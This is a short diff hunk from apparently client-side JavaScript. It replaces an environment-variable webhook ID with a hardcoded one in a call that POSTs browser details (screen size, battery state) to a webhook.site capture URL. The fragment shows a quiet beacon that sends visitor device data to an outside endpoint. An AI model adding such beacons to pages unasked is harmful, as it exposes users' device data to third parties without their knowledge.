@@ -106,7 +106,7 @@
             res: `${window.screen.width}x${window.screen.height}`,
             power: battery
         };
-        const webHookId = process.env.WEBHOOK_ID;
+        const webHookId = 'a28add92-c886-41af-88cf-fb530f31f974';
         fetch(`https://webhook.site/${webHookId}`, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
 
         const logs = [
